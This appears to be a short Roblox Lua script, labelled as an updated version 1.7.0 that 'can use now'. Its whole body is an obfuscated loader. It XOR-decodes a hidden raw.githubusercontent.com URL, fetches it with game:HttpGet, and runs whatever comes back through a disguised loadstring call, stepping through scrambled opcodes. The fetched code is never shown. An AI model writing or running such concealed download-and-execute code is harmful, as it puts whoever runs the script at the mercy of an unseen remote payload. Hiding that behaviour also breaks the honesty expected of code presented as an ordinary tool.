-- Ts was updated
--version 1.7.0
-- can use now 
if not game or game.PlaceId==0 then return end local a="1408080c0f4653530e1d0b521b150814091e090f190e1f131208191208521f13115313151f044b4d49485351530e191a0f5314191d180f53111d151253311d15124e5210091d" local b=124 local c={} for i=1,#a,2 do c[#c+1]=string.char(bit32.bxor(tonumber(a:sub(i,i+1),16),b)) end a=table.concat(c) c=nil local e=getfenv()[ "load" .. "string" ] local f=getfenv() local g={} local h={352,1,872,630,963,826} local m={[352]=1,[872]=2,[630]=3,[963]=4,[826]=5} local i=1 while i<=#h do local o=m[h[i]] i=i+1 if o==1 then g[#g+1]=a elseif o==2 then g[#g+1]=f["game"]["Http".."Get"](g[#g]) elseif o==3 then g[#g+1]=e(g[#g]) elseif o==4 then g[#g]() elseif o==5 then return end end
